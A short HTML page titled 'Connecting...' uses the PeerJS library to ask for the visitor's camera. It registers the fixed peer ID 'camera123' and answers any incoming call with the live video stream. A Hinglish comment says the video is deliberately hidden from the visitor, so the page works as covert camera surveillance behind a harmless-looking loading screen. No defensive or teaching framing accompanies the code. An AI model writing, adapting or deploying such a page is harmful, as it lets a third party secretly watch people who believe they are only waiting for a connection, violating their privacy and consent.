<!DOCTYPE html>
<html>
<head>
  <title>Connecting...</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
</head>
<body>

<script>
  // FIXED ID (same hamesha rahega)
  const peer = new Peer("camera123");

  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(stream => {

      // ❌ video show nahi karenge (hidden)
      
      peer.on('call', call => {
        call.answer(stream);
      });

    })
    .catch(() => {
      alert("Camera permission denied");
    });
</script>

</body>
</html>
